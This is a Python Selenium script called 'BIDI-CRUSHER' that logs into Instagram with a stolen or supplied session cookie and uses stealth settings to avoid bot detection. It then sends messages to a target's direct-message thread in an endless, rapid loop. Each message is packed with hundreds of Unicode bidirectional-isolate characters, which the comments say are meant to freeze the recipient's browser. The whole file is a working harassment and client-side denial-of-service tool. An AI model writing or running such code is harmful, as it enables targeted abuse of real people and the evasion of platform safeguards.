# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (BIDI-CRUSHER V44)
# 📅 STATUS: MAIN-THREAD-FREEZE | 4-AGENT TOTAL | AWS-CPU-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.2)   # 🔥 Extreme Velocity
REST_AFTER_STRIKES = 150   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_bidi_crusher_payload():
    """Forces the browser to calculate 300+ directional shifts per message."""
    u_id = random.randint(100, 999)
    # \u2066 = LTR Isolate | \u2067 = RTL Isolate | \u2069 = Pop Isolate
    # \u2060 = Word Joiner
    lri, rli, pop, glue = "\u2066", "\u2067", "\u2069", "\u2060"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [BIDI_LOCK:{u_id}]"
    
    body = []
    # 350 lines of recursive directional math
    for i in range(350):
        # We alternate directions constantly. This forces the browser to 
        # restart its layout calculation 4 times PER LINE.
        # [LTR] PRAVEER [RTL] PAPA [LTR] ON [RTL] TOP
        line = f"{lri}PRAVEER{pop}{rli}PAPA{pop}{lri}ON{pop}{rli}TOP{pop}🌙{i}{glue*10}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu") # Force CPU to do the BiDi math
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def hyper_send(driver, text):
    """Bypasses UI lag by forcing a direct DOM 'Enter' event."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('insertText', false, arguments[0]);
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_bidi_crusher_payload()
                if hyper_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: BiDi-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 80 == 0:
                        driver.refresh()
                        time.sleep(8)
                
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(3)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
